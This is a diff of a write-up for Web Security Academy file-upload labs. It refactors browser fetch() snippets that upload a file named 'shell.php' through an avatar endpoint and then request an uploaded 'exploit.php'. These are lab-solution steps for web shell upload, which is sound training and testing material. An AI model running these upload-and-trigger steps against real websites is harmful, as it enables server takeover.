@@ -27,15 +27,11 @@ fd.append(
     "shell.php",
   ),
 );
-fetch(
-  "https://0ad800ba04fb60a081dbe4fb002700ab.web-security-academy.net/my-account/avatar",
-  {
-    body: fd,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
-  },
-);
+fetch(`${location.origin}/my-account/avatar`, {
+  body: fd,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: Web shell upload via Content-Type restriction bypass
@@ -62,7 +58,6 @@ fd.append(
 fetch(`${location.origin}/my-account/avatar`, {
   body: fd,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -92,7 +87,6 @@ fd.append(
 fetch(`${location.origin}/my-account/avatar`, {
   body: fd,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -125,7 +119,6 @@ fd.append(
 fetch(`${location.origin}/my-account/avatar`, {
   body: fd,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -146,7 +139,6 @@ fd.append(
 fetch(`${location.origin}/my-account/avatar`, {
   body: fd,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -187,7 +179,6 @@ fd.append(
 fetch(`${location.origin}/my-account/avatar`, {
   body: fd,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -325,7 +316,6 @@ fd.append(
 fetch(`${location.origin}/my-account/avatar`, {
   body: fd,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 fetch(`${location.origin}/files/avatars/exploit.php`)
